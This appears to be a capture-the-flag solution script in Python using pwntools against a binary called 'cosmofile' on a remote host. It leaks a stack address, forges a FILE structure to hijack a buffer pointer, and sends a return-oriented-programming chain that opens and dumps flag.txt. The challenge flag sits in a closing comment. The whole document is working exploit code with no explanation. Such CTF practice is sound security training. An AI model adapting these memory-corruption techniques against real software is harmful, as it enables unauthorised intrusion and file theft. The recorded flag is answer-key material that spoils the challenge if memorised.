from pwn import *


elf = context.binary = ELF("cosmofile")


# p = process()
p = remote("34.45.81.67",16005)



# gdb.attach(p,"b *0x40c7e5")
p.sendline("1")
A = p.recvuntil("ferent light!")
stack_leak = u64(A[489*8:(489 + 1) * 8]) >> 8
ret = stack_leak - 0xf38


file_struct = b""
file_struct += p8(0x00)         # bufmode
file_struct += p8(0x01)         # freethis
file_struct += p8(0x01)         # freebuf
file_struct += p8(0)         # forking
file_struct += p32(578)         # oflags
file_struct += p32(0x0)         # state
file_struct += p32(0)         # fd
file_struct += p32(0x0)         # pid
file_struct += p32(0x0)           # atomic refs
file_struct += p32(0x2000)       # size
file_struct += p32(0)        # beg
file_struct += p64(0x0) 
file_struct += p64(ret)  # char *buf

file_struct += p64(0x0)  # _edges
file_struct += p64(0x2)  # _word
file_struct += p32(0x0)          # _futex
file_struct += p32(0x44444444)          # _pid
file_struct += p64(0)  # _nsync[0]
file_struct += p64(0)  # _nsync[1]

file_struct += p64(0x42f338)  # prev
file_struct += p64(0x42f3d8)  # next
file_struct += p64(0)

print(hex(len(file_struct)))

p.sendline("7238770")
p.send(file_struct)


print("bdd",hex(elf.bss(0x200)))
print("stack_leak",hex(stack_leak))
print("ret",hex(ret))


syscall = 0x4111fa 
pop_rax =  0x000000000040bdf5

def pop_rdi(val):
    # 0x00000000004111f1 : pop rdi ; pop rbx ; ret
    return flat([
        0x00000000004111f1, val, 0,
    ])
def pop_rsi(val):
    # 0x0000000000401e1b : pop rsi ; pop rbp ; ret
    return flat([
        0x0000000000401e1b, val, 0,
    ])
def pop_rdx(val):
    # 0x0000000000427748 : pop rdx ; pop rbx ; pop rbp ; ret
    return flat([
        0x0000000000427748, val, 0, 0,
    ])
def pop_r10_syscall(val):
    # 0x00000000004111f0 : pop r15 ; pop rbx ; ret
    return flat([
        0x00000000004111f0,val, 0,
        0x0000000000401a5f, # : mov rcx, r15 ; ret
        0x000000000041710e, #: mov r10, rcx ; syscall
    ])


# gdb.attach(p,"b fread")
# gdb.attach(p,"b *0x00000000004111f0")
p.sendline("1")
p.send(cyclic(4125 - 9) + b"flag.txt\x00" + flat([
    pop_rdi(ret + 0xfff),
    pop_rsi(0),
    pop_rdx(0o777),
    pop_rax,0x2,
    syscall,

    pop_rdi(1),
    pop_rsi(4),
    pop_rdx(0),
    pop_rax,0x28,
    pop_r10_syscall(0x50),
    # syscall
]))




p.interactive()


# L3AK{JU57_b3c4u43_7H3R3_15_N0_vft4bl3_D035N7_m34n_Y0U_5h0uld_61V3_up}